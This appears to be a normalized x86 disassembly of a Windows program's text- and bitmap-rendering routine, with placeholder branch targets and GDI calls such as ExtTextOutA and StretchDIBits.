mov eax [ ebp + 0x18 ]
mov [ esp + 0xc4 ] ecx
add ecx eax
mov [ esp + 0xcc ] ecx
mov ecx [ rw-data ]
add esp 0x8
push ecx
call [ CreateSolidBrush@IAT ]
push eax
lea edx [ esp + 0xbc ]
mov [ esp + 0x14 ] eax
mov eax [ ebp + 0x8 ]
push edx
push eax
call [ FillRect@IAT ]
mov ecx [ esp + 0x10 ]
push ecx
call [ DeleteObject@IAT ]
cmp ebx 0x2
jl r-xdata
mov ebx 0x1
mov [ esp + 0x54 ] ebx
dec [ esi + 0x8 ]
jne r-xdata
mov eax [ esp + 0x5c ]
test eax eax
jle r-xdata
mov eax [ ecx + 0x4 ]
mov ecx [ ebp + 0x10 ]
cmp eax ecx
jle r-xdata
mov ecx eax
sub ecx edx
mov edx [ ebp + 0x1c ]
add edx ecx
mov ecx [ ebp + 0x14 ]
mov [ ebp + 0x1c ] edx
mov edx [ ebp + 0xc ]
sub edx eax
add ecx edx
mov edx eax
mov [ ebp + 0x14 ] ecx
mov ecx [ ebp + 0x38 ]
mov [ ebp + 0xc ] edx
mov edx [ rw-data ]
mov eax [ ebp + 0x8 ]
push edx
push eax
call [ SetTextColor@IAT ]
mov ecx [ rw-data ]
mov edx [ ebp + 0x8 ]
push ecx
push edx
call [ SetBkColor@IAT ]
mov eax [ ebp + 0x8 ]
push 0x1
push eax
call [ SetBkMode@IAT ]
mov ecx [ ebp + 0x8 ]
push ecx
call [ CreateCompatibleDC@IAT ]
test eax eax
mov [ esp + 0x18 ] eax
je r-xdata
mov eax [ esi + 0x8 ]
test eax eax
jge r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ esp + 0x50 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x38 ]
mov eax [ eax + 0x8 ]
mov [ esp + 0x1c ] eax
mov eax [ ebp + 0x14 ]
add edx eax
mov eax [ esp + 0x1c ]
cmp eax edx
jge r-xdata
mov edx eax
sub edx ecx
mov ecx [ ebp + 0x20 ]
add ecx edx
mov edx [ ebp + 0x18 ]
mov [ ebp + 0x20 ] ecx
mov ecx [ ebp + 0x10 ]
sub ecx eax
add edx ecx
mov ecx eax
mov [ ebp + 0x18 ] edx
mov edx [ ebp + 0xc ]
mov [ ebp + 0x10 ] ecx
mov eax [ rw-data ]
test eax eax
push 0x0
mov ecx esi
push edi
jne r-xdata
mov [ esi + 0x8 ] 0x0
push eax
call [ LocalUnlock@IAT ]
mov [ esi + 0x20 ] 0x0
mov eax [ ebp + 0x14 ]
test eax eax
jle r-xdata
mov edx [ ebp + 0x38 ]
mov eax [ edx + 0xc ]
mov edx [ ebp + 0x18 ]
add edx ecx
cmp eax edx
mov edx [ ebp + 0x24 ]
jge r-xdata
sub eax [ ebp + 0xc ]
mov [ ebp + 0x14 ] eax
mov [ esp + 0x3c ] 0x0
call sub_43a020
push 0x1
push edi
mov ecx esi
mov [ esp + 0x98 ] eax
call sub_43a020
mov ecx [ esp + 0x90 ]
mov edx [ esp + 0x18 ]
mov edi [ SelectObject@IAT ]
push ecx
push edx
mov [ esp + 0x9c ] eax
call edi
push 0x0
push ebx
mov ecx esi
mov [ esp + 0x38 ] eax
call sub_43a020
push 0x1
push ebx
mov ecx esi
mov [ esp + 0xa0 ] eax
call sub_43a020
mov ecx [ ebp + 0x8 ]
mov [ esp + 0x9c ] eax
mov eax [ esp + 0x98 ]
push eax
push ecx
call edi
mov [ esp + 0x50 ] eax
mov eax [ esp + 0x20 ]
test eax eax
mov [ esp + 0x64 ] 0x0
jle r-xdata
call sub_43a020
mov edx [ esp + 0x18 ]
mov edi [ SelectObject@IAT ]
push eax
push edx
mov [ esp + 0xd0 ] eax
call edi
push 0x0
push ebx
mov ecx esi
mov [ esp + 0xd4 ] eax
call sub_43a020
push eax
mov [ esp + 0x20 ] eax
mov eax [ ebp + 0x8 ]
push eax
call edi
mov [ esp + 0x84 ] eax
mov eax [ esp + 0x20 ]
test eax eax
mov [ esp + 0x58 ] 0x0
jle r-xdata
lea ecx [ esp + 0x18 ]
call sub_435880
jmp r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
jle r-xdata
sub eax ecx
mov [ ebp + 0x18 ] eax
fld [ r--data ]
mov ebx [ ebp + 0x24 ]
fdiv [ esp + 0xa0 ]
mov edx [ ebp + 0x14 ]
mov ecx [ ebp + 0x1c ]
mov eax ebx
sub eax edx
sub eax ecx
mov [ esp + 0x1c ] eax
fild [ esp + 0x1c ]
fmul st1
call sub_4b64c4
mov edi eax
test edi edi
jge r-xdata
push 0x1
mov edx eax
push edx
mov ecx esi
call sub_43a020
mov [ esp + 0x64 ] eax
fld [ r--data ]
fdiv [ esp + 0xa0 ]
fild [ ebp + 0x20 ]
fmul st1
call sub_4b64c4
test eax eax
mov [ esp + 0x10 ] eax
jge r-xdata
mov ecx eax
push 0x0
push ecx
mov ecx esi
call sub_43a020
mov [ esp + 0x58 ] eax
test edx edx
jle r-xdata
sub ebx [ ebp + 0x1c ]
mov [ esp + 0x1c ] ebx
fild [ esp + 0x1c ]
fmul st1
call sub_4b64c4
fstp st0
mov ebx eax
lea ecx [ esi + 0xd38 ]
mov [ esp + 0x28 ] ebx
call sub_43a080
cmp ebx eax
jl r-xdata
xor edi edi
mov eax [ ebp + 0x20 ]
mov edx [ ebp + 0x18 ]
add edx eax
mov [ esp + 0x24 ] edx
fild [ esp + 0x24 ]
fmul st1
call sub_4b64c4
fstp st0
mov edi eax
lea ebx [ esi + 0xd38 ]
mov ecx ebx
mov [ esp + 0x4c ] edi
call sub_43a080
cmp edi eax
jl r-xdata
mov [ esp + 0x10 ] 0x0
mov eax [ ebp + 0x28 ]
test eax eax
jle r-xdata
mov ecx [ ebp + 0x14 ]
push ecx
push ebx
push edi
lea edx [ esp + 0xa24 ]
push r--data
push edx
call [ wsprintfA@IAT ]
add esp 0x14
lea eax [ esp + 0xa18 ]
push eax
call [ OutputDebugStringA@IAT ]
cmp edi ebx
mov [ esp + 0x4c ] edi
jg r-xdata
lea ecx [ esi + 0xd38 ]
call sub_43a080
mov ebx eax
dec ebx
mov [ esp + 0x28 ] ebx
mov eax [ esp + 0x10 ]
cmp eax edi
mov [ esp + 0x34 ] eax
jg r-xdata
mov ecx ebx
call sub_43a080
mov edi eax
dec edi
mov [ esp + 0x4c ] edi
cmp edx 0x2710
fild [ esp + 0x4c ]
fidiv [ ebp + 0x24 ]
fstp [ esp + 0xa8 ]
fild [ esp + 0x5c ]
fidiv [ ebp + 0x28 ]
fstp [ esp + 0x88 ]
fild [ ebp + 0x1c ]
fmul [ esp + 0xa8 ]
fstp [ esp + 0xa0 ]
jg r-xdata
mov eax [ esp + 0x30 ]
mov ecx [ esp + 0x18 ]
mov edi [ SelectObject@IAT ]
push eax
push ecx
call edi
mov edx [ esp + 0x90 ]
mov esi [ DeleteObject@IAT ]
push edx
call esi
mov eax [ esp + 0x94 ]
push eax
call esi
mov ecx [ esp + 0x50 ]
mov edx [ ebp + 0x8 ]
push ecx
push edx
call edi
mov eax [ esp + 0x98 ]
push eax
call esi
mov ecx [ esp + 0x9c ]
push ecx
call esi
mov eax [ esp + 0x64 ]
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x1c ]
mov ecx [ ebp + 0x20 ]
sub eax edx
mov [ esp + 0x84 ] eax
mov eax [ ebp + 0x10 ]
sub eax ecx
mov [ esp + 0x6c ] eax
lea esp [ esp ]
mov ecx [ esp + 0xcc ]
mov edx [ esp + 0x18 ]
mov edi [ SelectObject@IAT ]
push ecx
push edx
call edi
mov eax [ esp + 0xc8 ]
mov esi [ DeleteObject@IAT ]
push eax
call esi
mov ecx [ esp + 0x84 ]
mov edx [ ebp + 0x8 ]
push ecx
push edx
call edi
mov eax [ esp + 0x1c ]
push eax
call esi
mov eax [ esp + 0x58 ]
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x1c ]
mov ecx [ ebp + 0x20 ]
sub eax edx
mov [ esp + 0x68 ] eax
mov eax [ ebp + 0x10 ]
sub eax ecx
mov [ esp + 0x28 ] eax
jmp r-xdata
mov [ ebp + 0x2c ] 0x0
cmp eax 0x2710
jle r-xdata
mov edx [ esp + 0x18 ]
push edx
call [ DeleteDC@IAT ]
mov eax 0x1
mov ecx [ esp + 0xf44 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x3c
push eax
call esi
mov eax [ esp + 0x28 ]
inc edi
cmp edi eax
mov [ esp + 0x4c ] edi
jle r-xdata
jmp r-xdata
push eax
call esi
jmp r-xdata
fild [ esp + 0x34 ]
mov ecx [ esi + 0xd3c ]
mov edx [ esp + 0x34 ]
mov eax [ ecx + edx * 8 ]
fmul [ esp + 0xa0 ]
lea edi [ ecx + edx * 8 ]
add eax [ esi + 0xd30 ]
fadd [ esp + 0x88 ]
sub esp 0x8
mov [ esp + 0x50 ] edi
mov [ esp + 0x4c ] eax
fstp [ esp ]
mov [ esp + 0x40 ] 0x0
mov [ esp + 0x44 ] 0x0
call sub_452510
add eax [ esp + 0x30 ]
mov [ esp + 0x34 ] eax
mov eax [ edi + 0x4 ]
add esp 0x8
xor ebx ebx
test eax eax
jle r-xdata
cmp [ ebp + 0x2c ] 0x1
je r-xdata
mov eax [ esp + 0x5c ]
cmp [ ebp + 0x28 ] eax
jne r-xdata
lea ecx [ esp + 0xf8 ]
call sub_439410
lea ecx [ esp + 0x588 ]
call sub_439410
cmp edx [ esp + 0x4c ]
mov [ esp + 0xf4c ] 0x2
jne r-xdata
mov ecx [ esi + 0xd3c ]
mov edx [ esi + 0xd30 ]
mov eax [ ecx + edi * 8 ]
lea ebx [ ecx + edi * 8 ]
add eax edx
lea ecx [ esi + 0xd38 ]
mov [ esp + 0x48 ] ebx
mov [ esp + 0x44 ] eax
mov [ esp + 0x38 ] 0x0
mov [ esp + 0x3c ] 0x0
call sub_43a080
sub eax edi
mov [ esp + 0x1c ] eax
fild [ esp + 0x1c ]
sub esp 0x8
fmul [ esp + 0xa8 ]
fsub [ esp + 0x90 ]
fstp [ esp ]
call sub_452510
add eax [ esp + 0x8c ]
mov [ esp + 0x60 ] eax
mov eax [ ebx + 0x4 ]
add esp 0x8
test eax eax
mov [ esp + 0x14 ] 0x0
jle r-xdata
mov ecx [ esp + 0x14 ]
mov esi [ esp + 0x44 ]
lea eax [ ecx + esi ]
mov [ esp + 0x2c ] eax
mov al [ eax ]
mov dl al
xor dl 0x20
add dl 0x5f
cmp dl 0x3b
ja r-xdata
mov eax [ esp + 0x34 ]
mov ecx [ esp + 0x4c ]
inc eax
cmp eax ecx
mov [ esp + 0x34 ] eax
jle r-xdata
mov edi [ esp + 0x44 ]
mov al [ ebx + edi ]
lea esi [ ebx + edi ]
mov cl al
xor cl 0x20
add cl 0x5f
cmp cl 0x3b
ja r-xdata
mov al [ ebp + 0x40 ]
test al al
push 0x0
je r-xdata
call sub_43abf0
test eax eax
jne r-xdata
cmp edi 0x2000000c
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0x18 ]
je r-xdata
cmp al 0x28
je r-xdata
mov edx [ rw-data ]
test edx edx
je r-xdata
mov edi 0x1
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov edx [ esp + 0x60 ]
mov eax [ esp + 0x50 ]
mov ecx [ esp + 0x2c ]
push 0x0
push edx
mov edx [ esp + 0x3c ]
push eax
mov eax [ esp + 0x60 ]
push 0x0
push 0x0
push ecx
push edx
push eax
push ebx
push edi
lea ecx [ esp + 0x124 ]
call sub_43ba10
test eax eax
jne r-xdata
mov ecx [ esp + 0x60 ]
mov edx [ esp + 0x50 ]
mov eax [ esp + 0x2c ]
push 0x1
push ecx
mov ecx [ esp + 0x3c ]
push edx
mov edx [ esp + 0x60 ]
push 0x0
push 0x0
push eax
push ecx
push edx
push ebx
push edi
lea ecx [ esp + 0x124 ]
call sub_43ba10
test eax eax
jne r-xdata
cmp edi 0x10000001
je r-xdata
mov esi [ ebp + 0x1c ]
add ecx 0x2
add esi ecx
cmp esi edx
jle r-xdata
cmp edi 0x20000010
jne r-xdata
mov ebx 0x1
cmp al 0x29
je r-xdata
mov ebx 0x2
jmp r-xdata
cmp al 0x81
jne r-xdata
test ah 0x41
jne r-xdata
test ah 0x41
jne r-xdata
mov edi 0x2
jmp r-xdata
cmp al 0x81
jne r-xdata
lea ecx [ esp + 0x588 ]
call sub_43a1f0
lea ecx [ esp + 0xf8 ]
call sub_43a1f0
mov eax [ ebp + 0x2c ]
test eax eax
mov edi [ ebp + 0x8 ]
jne r-xdata
mov ax [ esp + 0x106 ]
cmp ax 0x8
mov ecx 0x10a
lea esi [ esp + 0xf8 ]
lea edi [ esp + 0xb18 ]
[ edi ] [ esi ]
je r-xdata
mov ecx [ esp + 0x5c ]
mov edx [ esp + 0x4c ]
mov eax [ esp + 0x28 ]
xor esi esi
push esi
push 0x1
push ecx
mov ecx [ esp + 0x3c ]
push edx
mov edx [ esp + 0x60 ]
push esi
push esi
push eax
push ecx
push edx
push ebx
push edi
lea ecx [ esp + 0x124 ]
call sub_43ba10
test eax eax
jne r-xdata
cmp edi 0x10000010
jne r-xdata
cmp edi 0x2000000c
jne r-xdata
sub edx [ ebp + 0x1c ]
mov ecx edx
mov dl [ ebp + 0x40 ]
test dl dl
push 0x0
je r-xdata
mov edi [ ebp + 0x8 ]
mov ecx [ esp + esi * 4 + 0x90 ]
mov edx [ esp + 0x18 ]
push ecx
push edx
mov [ esp + 0x3c ] esi
call [ SelectObject@IAT ]
mov eax [ esp + esi * 4 + 0x98 ]
mov edi [ ebp + 0x8 ]
push eax
push edi
call [ SelectObject@IAT ]
jmp r-xdata
cmp al 0x7b
je r-xdata
mov esi 0x1
cmp [ ecx + esi + 0x1 ] 0x73
jne r-xdata
mov eax [ esp + 0x3c ]
mov ecx [ esp + 0x38 ]
push eax
push ecx
call sub_452510
mov ecx [ esp + 0x70 ]
mov edx [ esp + 0x5c ]
add eax ecx
lea ecx [ eax + edx ]
mov edx [ esp + 0xc0 ]
add esp 0x8
cmp edx ecx
jge r-xdata
fld [ esp + 0x38 ]
fadd [ esp + 0xb0 ]
fstp [ esp + 0x38 ]
mov eax [ rw-data ]
test eax eax
jle r-xdata
fild [ rw-data ]
jmp r-xdata
fld [ esp + 0x38 ]
cmp al 0x9
fcomp [ r--data ]
fnstsw ax
jne r-xdata
cmp [ ebx + edi + 0x1 ] 0x73
jne r-xdata
push 0x4
push edi
call [ SetStretchBltMode@IAT ]
push 0x0
push 0x0
push 0x0
push edi
call [ SetBrushOrgEx@IAT ]
push 0x3
push edi
call [ SetStretchBltMode@IAT ]
jmp r-xdata
movzx ecx ax
mov eax ecx
imul eax [ ebp + 0x14 ]
cdq
and edx 0x7
add eax edx
sar eax 0x3
add eax 0x10
cmp ax 0x18
je r-xdata
mov eax [ esp + 0x524 ]
mov edi [ esp + 0x538 ]
lea ebx [ esp + 0xf8 ]
mov [ esp + 0x14 ] ebx
mov [ esp + 0x50 ] eax
mov [ esp + 0x30 ] esi
mov [ esp + 0x28 ] esi
mov [ esp + 0x34 ] edi
mov ecx [ ebx + 0x4 ]
mov edx [ ebx + 0x8 ]
mov ebx [ ebp + 0x18 ]
mov esi [ ebp + 0x1c ]
mov eax edi
and eax 0xff
mov [ esp + 0x20 ] ebx
mov ebx [ ebp + 0x2c ]
cmp ebx 0x6
mov [ esp + 0x54 ] ecx
mov ecx [ ebp + 0x20 ]
mov [ esp + 0x10 ] edx
mov edx [ ebp + 0x14 ]
mov [ esp + 0x84 ] eax
mov eax esi
je r-xdata
mov eax [ ebp + 0x18 ]
mov edx [ ebp + 0x20 ]
add eax 0x2
lea esi [ eax + edx ]
mov edx [ ebp + 0x28 ]
cmp esi edx
jle r-xdata
mov edx [ ebp + 0x1c ]
push 0x0
push eax
mov eax [ esp + 0x34 ]
push ecx
mov ecx [ ebp + 0x20 ]
push ecx
mov ecx [ esp + 0x44 ]
push edx
mov edx [ esp + 0x68 ]
push eax
push ecx
push edx
push ebx
push edi
lea ecx [ esp + 0x124 ]
call sub_43ba10
test eax eax
jne r-xdata
mov edx [ esp + 0x2c ]
push eax
mov eax [ ebp + 0x20 ]
push ecx
mov ecx [ ebp + 0x1c ]
push eax
mov eax [ esp + 0x40 ]
push ecx
mov ecx [ esp + 0x64 ]
push edx
push eax
push ecx
push ebx
push edi
lea ecx [ esp + 0x120 ]
call sub_43ce20
test eax eax
jne r-xdata
mov eax [ esp + 0x2c ]
mov ecx [ esp + 0x18 ]
lea edx [ esp + 0xa8 ]
push edx
push ebx
push eax
push ecx
call [ GetTextExtentPoint32A@IAT ]
fld [ esp + 0x38 ]
fcomp [ r--data ]
fnstsw ax
test ah 0x41
jne r-xdata
fld [ esp + 0x38 ]
fcomp [ r--data ]
fnstsw ax
test ah 0x41
jne r-xdata
mov ecx [ esp + 0x2c ]
cmp [ ecx ] 0x9
jne r-xdata
cmp al 0x7d
je r-xdata
cmp al 0x81
jne r-xdata
lea eax [ esp + 0xcc ]
push eax
lea edx [ esp + 0xcc ]
push edx
push ecx
push esi
call sub_439f30
mov eax [ esp + 0xd8 ]
add esp 0x10
test eax eax
mov [ esp + 0x78 ] 0x0
mov [ esp + 0x7c ] 0x0
je r-xdata
mov edx [ esp + 0x18 ]
lea ecx [ esp + 0xd0 ]
push ecx
push edi
push esi
push edx
call [ GetTextExtentPoint32A@IAT ]
fild [ esp + 0xd0 ]
fmul [ esp + 0x70 ]
fadd [ esp + 0x38 ]
fstp [ esp + 0x38 ]
cmp [ esp + 0xc0 ] eax
jle r-xdata
fild [ rw-data ]
fmul [ esp + 0xe8 ]
fmul [ esp + 0x70 ]
fld [ esp + 0x38 ]
fdiv st1
call sub_4b64c4
inc eax
mov [ esp + 0x10 ] eax
fild [ esp + 0x10 ]
fmul st1
fstp [ esp + 0x38 ]
fstp st0
jmp r-xdata
dec eax
mov [ esp + 0x10 ] eax
fild [ esp + 0x10 ]
fmul [ esp + 0xb0 ]
fadd [ esp + 0x38 ]
fstp [ esp + 0x38 ]
cmp al 0x81
jne r-xdata
lea edx [ esp + 0x50 ]
push edx
lea eax [ esp + 0x34 ]
push eax
push ebx
push edi
call sub_439f30
mov eax [ esp + 0x40 ]
add esp 0x10
test eax eax
mov [ esp + 0x78 ] 0x0
mov [ esp + 0x7c ] 0x0
je r-xdata
lea ecx [ esp + 0x588 ]
call sub_43a1f0
lea ecx [ esp + 0xf8 ]
call sub_43a1f0
lea ecx [ esp + 0x18 ]
call sub_435880
xor eax eax
test esi esi
setge al
mov ecx [ esp + 0xf44 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x3c
fild [ ebp + 0x18 ]
mov edx [ esp + 0x524 ]
mov esi [ esp + 0x534 ]
push 0xcc0020
fmul [ esp + 0x8c ]
push 0x0
lea ecx [ esp + 0x100 ]
push ecx
push edx
sub esp 0x8
fstp [ esp ]
call sub_452510
fild [ ebp + 0x14 ]
add esp 0x8
push eax
sub esp 0x8
fmul [ esp + 0xc4 ]
fstp [ esp ]
call sub_452510
mov ebx [ ebp + 0x18 ]
add esp 0x8
push eax
mov eax [ ebp + 0x20 ]
lea ecx [ ebx + eax ]
mov [ esp + 0x34 ] ecx
fild [ esp + 0x34 ]
sub esp 0x8
fmul [ esp + 0xa8 ]
fstp [ esp ]
call sub_452510
mov edx [ esp + 0xc4 ]
add esp 0x8
sub esi eax
mov eax [ esp + 0xb8 ]
push esi
push edx
push eax
call sub_452510
mov ecx [ ebp + 0x14 ]
mov edx [ ebp + 0x10 ]
add esp 0x8
push eax
mov eax [ ebp + 0xc ]
push ebx
push ecx
push edx
push eax
push edi
call [ StretchDIBits@IAT ]
mov esi eax
jmp r-xdata
push 0x0
call [ CreateCompatibleDC@IAT ]
mov edi eax
test edi edi
push esi
je r-xdata
movzx ecx ax
mov eax ecx
imul eax [ ebp + 0x14 ]
add eax 0x7
cdq
and edx 0x7
add eax edx
sar eax 0x3
add eax 0xf
jmp r-xdata
test esi esi
jle r-xdata
cmp ebx 0x7
jne r-xdata
sub edx [ ebp + 0x20 ]
mov eax edx
mov al [ ebp + 0x3c ]
test al al
je r-xdata
mov edx [ ebp + 0x18 ]
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0x10 ]
push 0x0
push 0x0
push edx
mov edx [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push ecx
push edx
push eax
lea ecx [ esp + 0x114 ]
call sub_43af50
mov esi eax
jmp r-xdata
mov edx [ esp + 0x3c ]
mov eax [ esp + 0x38 ]
push edx
push eax
call sub_452510
mov edx [ esp + 0x74 ]
mov ecx [ esp + 0x5c ]
add eax edx
lea edx [ eax + ecx ]
mov ecx [ esp + 0xc4 ]
add esp 0x8
cmp ecx edx
jge r-xdata
fld [ esp + 0x38 ]
fadd [ esp + 0xb0 ]
fstp [ esp + 0x38 ]
mov eax [ rw-data ]
test eax eax
jle r-xdata
fild [ rw-data ]
jmp r-xdata
cmp al 0x3c
je r-xdata
cmp [ ecx + esi + 0x1 ] 0x62
jne r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x48 ]
mov edi [ ecx + 0x4 ]
add eax 0x2
xor esi esi
cmp eax edi
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] eax
mov [ esp + 0x60 ] esi
je r-xdata
mov eax [ esp + 0xcc ]
cmp eax [ esp + 0x14 ]
mov [ esp + 0x10 ] eax
jge r-xdata
mov esi [ esp + 0x5c ]
mov edx [ esp + 0x2c ]
push 0x0
push edi
push esi
push 0x0
push 0x0
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ ExtTextOutA@IAT ]
add ebx edi
cmp [ ebx + edi + 0x1 ] 0x62
jne r-xdata
mov ecx [ esp + 0x48 ]
mov edi [ ecx + 0x4 ]
add ebx 0x2
xor esi esi
cmp ebx edi
mov [ esp + 0x10 ] ebx
mov [ esp + 0x60 ] esi
je r-xdata
mov edi [ esp + 0x50 ]
cmp edi ebx
jge r-xdata
call [ DeleteObject@IAT ]
jmp r-xdata
push edi
call [ SelectObject@IAT ]
mov eax [ ebp + 0x2c ]
test eax eax
jne r-xdata
and eax 0xfffffff0
shl eax 0x3
cdq
idiv ecx
mov ebx [ ebp + 0x18 ]
push 0x0
push 0x0
lea ecx [ esp + 0xb20 ]
mov [ esp + 0xb28 ] ebx
mov [ esp + 0xb24 ] eax
lea eax [ esp + 0x8c ]
push eax
push 0x0
push ecx
push 0x0
call [ CreateDIBSection@IAT ]
mov esi eax
test esi esi
mov [ esp + 0x10 ] esi
je r-xdata
mov edx [ ebp + 0x20 ]
test edx edx
jle r-xdata
lea eax [ esi - 0x1 ]
cmp edi 0x2000000c
je r-xdata
cmp [ esp + 0x538 ] 0x40000020
jne r-xdata
test esi esi
jne r-xdata
cmp [ esp + 0xc4 ] eax
jle r-xdata
fild [ rw-data ]
fmul [ esp + 0xe8 ]
fmul [ esp + 0x70 ]
fld [ esp + 0x38 ]
fdiv st1
call sub_4b64c4
inc eax
mov [ esp + 0x1c ] eax
fild [ esp + 0x1c ]
fmul st1
fstp [ esp + 0x38 ]
fstp st0
jmp r-xdata
dec eax
mov [ esp + 0x1c ] eax
fild [ esp + 0x1c ]
fmul [ esp + 0xb0 ]
fadd [ esp + 0x38 ]
fstp [ esp + 0x38 ]
cmp al 0x3e
je r-xdata
add ecx 0x2
mov [ esp + 0x14 ] ecx
jmp r-xdata
mov edx [ esp + 0x48 ]
mov ecx [ esp + 0x14 ]
cmp ecx [ edx + 0x4 ]
jl r-xdata
mov edx [ esp + 0x44 ]
mov ecx eax
lea esp [ esp ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x44 ]
mov dl [ eax + ecx ]
lea edi [ eax + ecx ]
xor dl 0x20
add dl 0x5f
cmp dl 0x3b
ja r-xdata
add ebx 0x2
jmp r-xdata
mov eax [ esp + 0x48 ]
cmp ebx [ eax + 0x4 ]
jl r-xdata
mov ecx [ esp + 0x44 ]
mov ecx [ esp + 0x44 ]
mov dl [ edi + ecx ]
lea eax [ edi + ecx ]
xor dl 0x20
add dl 0x5f
mov cl 0x3b
cmp cl dl
sbb esi esi
lea edx [ esp + 0xd8 ]
push edx
add esi 0x2
push esi
push eax
mov eax [ esp + 0x24 ]
push eax
call [ GetTextExtentPoint32A@IAT ]
fld [ esp + 0x78 ]
fcom [ r--data ]
fnstsw ax
test ah 0x41
jne r-xdata
push 0x4
push edi
call [ SetStretchBltMode@IAT ]
push 0x0
push 0x0
push 0x0
push edi
call [ SetBrushOrgEx@IAT ]
push 0x3
push edi
call [ SetStretchBltMode@IAT ]
jmp r-xdata
mov esi [ ebp + 0x18 ]
mov edx [ ebp + 0x14 ]
add esi 0x2
add edx 0x2
mov [ esp + 0x20 ] esi
mov esi [ ebp + 0x24 ]
lea ebx [ edx + eax ]
cmp ebx esi
jle r-xdata
lea ecx [ edx - 0x1 ]
mov esi [ ebp + 0x24 ]
add edx 0x2
lea ebx [ edx + eax ]
cmp ebx esi
jle r-xdata
cmp edi 0x20000010
jne r-xdata
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x14 ]
mov edx [ ebp + 0x10 ]
push 0x0
push 0x0
push eax
mov eax [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push edx
push eax
push ecx
lea ecx [ esp + 0x114 ]
call sub_4394a0
mov esi eax
jmp r-xdata
fild [ esp + 0xa8 ]
fild [ esp + 0xac ]
jmp r-xdata
test esi esi
push 0x0
push ebx
jne r-xdata
add [ esp + 0x14 ] ebx
mov ebx 0x1
xor esi esi
jmp r-xdata
mov esi [ esp + 0x5c ]
mov edi [ esp + 0x4c ]
inc ecx
cmp al 0x81
jne r-xdata
mov ebx 0x1
xor esi esi
mov ebx 0x2
mov esi 0x1
jmp r-xdata
inc ebx
cmp al 0x81
jne r-xdata
fild [ esp + 0xd8 ]
add edi esi
cmp edi ebx
fmul [ esp + 0x70 ]
fadd st1
fstp [ esp + 0x78 ]
fstp st0
jl r-xdata
fadd [ esp + 0xb0 ]
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
push 0x0
push 0x0
push ebx
push eax
mov eax [ ebp + 0x8 ]
push ecx
push edx
push eax
lea ecx [ esp + 0x5a4 ]
call sub_43af50
push edi
mov esi eax
call [ DeleteDC@IAT ]
mov ecx [ esp + 0x10 ]
push ecx
call [ DeleteObject@IAT ]
jmp r-xdata
push edi
call [ DeleteDC@IAT ]
mov edx [ esp + 0x10 ]
push edx
fild [ ebp + 0x18 ]
mov eax [ esp + 0x524 ]
mov esi [ esp + 0x534 ]
push 0xcc0020
fmul [ esp + 0x8c ]
push 0x0
lea edx [ esp + 0x100 ]
push edx
push eax
sub esp 0x8
fstp [ esp ]
call sub_452510
fild [ ebp + 0x14 ]
add esp 0x8
push eax
sub esp 0x8
fmul [ esp + 0xc4 ]
fstp [ esp ]
call sub_452510
mov ecx [ ebp + 0x20 ]
lea edx [ ebx + ecx ]
mov [ esp + 0x38 ] edx
fild [ esp + 0x38 ]
add esp 0x8
push eax
sub esp 0x8
fmul [ esp + 0xa8 ]
fstp [ esp ]
call sub_452510
mov ecx [ esp + 0xc0 ]
add esp 0x8
sub esi eax
mov eax [ esp + 0xbc ]
push esi
push eax
push ecx
call sub_452510
mov esi [ ebp + 0x14 ]
add esp 0x8
push eax
push ebx
push esi
push 0x0
push 0x0
push edi
call [ StretchDIBits@IAT ]
mov edx [ esp + 0x84 ]
mov ecx [ esp + 0x538 ]
push 0x0
push ebx
push esi
push 0x0
push 0x0
push 0x0
push 0x0
push edx
lea eax [ esp + 0xb38 ]
push eax
push ecx
lea ecx [ esp + 0x5b0 ]
call sub_43ce20
test eax eax
je r-xdata
mov esi [ esp + 0x20 ]
lea ebx [ esi + ecx ]
mov esi [ ebp + 0x28 ]
cmp ebx esi
jle r-xdata
mov edx esi
sub edx eax
cmp edi 0x2000000c
jne r-xdata
mov edx esi
sub edx eax
cmp edi 0x2000000c
fmul [ esp + 0x70 ]
fadd [ esp + 0x38 ]
fstp [ esp + 0x38 ]
mov edx [ esp + 0x34 ]
push edx
push 0x0
push 0x0
push eax
mov eax [ esp + 0x70 ]
push eax
push edi
call [ ExtTextOutA@IAT ]
mov ecx [ esp + 0x34 ]
mov edx [ esp + 0x70 ]
push ecx
push esi
push esi
sub edx [ esp + 0xbc ]
mov [ esp + 0x30 ] edx
fild [ esp + 0x30 ]
push eax
sub esp 0x8
fmul [ esp + 0x90 ]
fmul [ r--data ]
fstp [ esp ]
call sub_452510
mov ecx [ esp + 0x78 ]
sub ecx [ esp + 0x74 ]
add esp 0x8
add eax ecx
push eax
push edi
call [ ExtTextOutA@IAT ]
fild [ esp + 0xac ]
jmp r-xdata
cmp [ esp + 0x34 ] esi
je r-xdata
mov al [ ecx + edx ]
mov bl al
xor bl 0x20
add bl 0x5f
cmp bl 0x3b
ja r-xdata
jmp r-xdata
add ecx 0x2
jmp r-xdata
cmp [ ecx + edx + 0x1 ] 0x74
je r-xdata
mov edx [ esp + 0x18 ]
lea ecx [ esp + 0xd8 ]
push ecx
push ebx
push edi
push edx
call [ GetTextExtentPoint32A@IAT ]
fld [ esp + 0x78 ]
fcom [ r--data ]
fnstsw ax
test ah 0x41
jne r-xdata
mov eax [ esp + esi * 4 + 0x90 ]
mov ecx [ esp + 0x18 ]
push eax
push ecx
mov [ esp + 0x3c ] esi
call [ SelectObject@IAT ]
mov edx [ esp + esi * 4 + 0x98 ]
mov eax [ ebp + 0x8 ]
push edx
push eax
call [ SelectObject@IAT ]
